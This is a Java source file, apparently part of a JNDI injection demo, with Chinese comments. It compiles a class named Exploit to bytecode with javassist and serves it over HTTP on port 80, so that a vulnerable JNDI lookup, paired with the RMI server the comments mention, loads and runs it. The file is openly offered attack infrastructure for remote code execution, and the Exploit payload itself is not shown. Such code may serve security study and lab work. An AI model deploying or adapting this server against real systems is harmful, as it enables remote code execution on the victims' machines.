package org.example.jndi.server;

import com.sun.net.httpserver.HttpServer;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.example.jndi.Exploit;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;

public class WebServer {
    private static final Integer port = 80;

    public static void main(String[] args) throws IOException, NotFoundException, CannotCompileException {

        // 使用 javassist 获取类字节
        ClassPool classPool = ClassPool.getDefault();
        final CtClass ctClass = classPool.get(Exploit.class.getName());
        // 修改类的名称，这里是为了去除类的包名，与 RMI Server 中保持一致
        ctClass.setName("Exploit");
        final byte[] bytes = ctClass.toBytecode();

        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
        server.createContext("/", httpExchange -> {
            // 将类的字节写入到 response 中
            System.out.println("Req Begin...");
            httpExchange.sendResponseHeaders(200, bytes.length);
            final OutputStream responseBody = httpExchange.getResponseBody();
            responseBody.write(bytes);
            responseBody.close();
            System.out.println("Req End.");
        });
        System.out.println("WebServer started at 0.0.0.0:" + port);
        server.start();
    }
}
